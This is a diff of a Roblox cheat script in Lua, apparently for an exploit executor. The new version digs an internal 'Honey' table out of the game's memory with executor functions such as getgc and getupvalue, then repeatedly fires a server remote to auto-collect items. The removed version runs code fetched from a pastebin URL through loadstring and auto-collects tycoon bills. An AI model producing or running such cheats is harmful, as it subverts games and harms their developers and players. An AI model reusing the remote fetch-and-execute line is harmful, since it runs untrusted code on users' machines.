@@ -1,28 +1,24 @@
-warn("Requiring API")do
-  loadstring(game:HttpGet("https://pastebin.com/raw/KMc6aBky"))();
-end warn("API Loaded")
+local wait = 2
 
-local child = object.child
-local descendant = object.descendant
-local check = object.check
+local Honey
+for i,v in next, getgc() do
+    if typeof(v) == "function" and islclosure(v) and not is_synapse_function(v) then
+        local Constants = getconstants(v)
+        
+        if table.find(Constants, "Auto Collect") and table.find(Constants, "PrimaryPart") then
+            Honey = getupvalue(v, 2)
+        end
+    end
+end
+while task.wait(wait) do
+local Meow = {}
+for i,v in next, Honey do
+    table.insert(Meow, i)
+end
 
-local Tycoon = game.Players.LocalPlayer.Tycoon.Value
-descendant.foreach(Tycoon.Items.OftenFiltered.Surface,"Bill",function(Bill)
-  local Settings = {
-          ["name"] = "CollectBill",
-          ["model"] = Bill.Parent
-  }
- 
-  game.ReplicatedStorage.Events.ClientTycoonInput:FireServer(Tycoon,Settings)
+game:GetService("ReplicatedStorage").Events.RemoteEvents.Honey:FireServer(Meow)
+table.foreach(Honey, function(a,b)
+    b[1]:Destroy()
+    table.remove(Honey, table.find(Honey, b))
 end)
-
-local Connection,Code = descendant.on_add(Tycoon.Items.OftenFiltered.Surface,function(Bill)
-  check.it(Bill.Name == "Bill",function()
-      local Settings = {
-              ["name"] = "CollectBill",
-              ["model"] = Bill.Parent
-      }
-     
-      game.ReplicatedStorage.Events.ClientTycoonInput:FireServer(Tycoon,Settings)
-  end)
-end)
+end
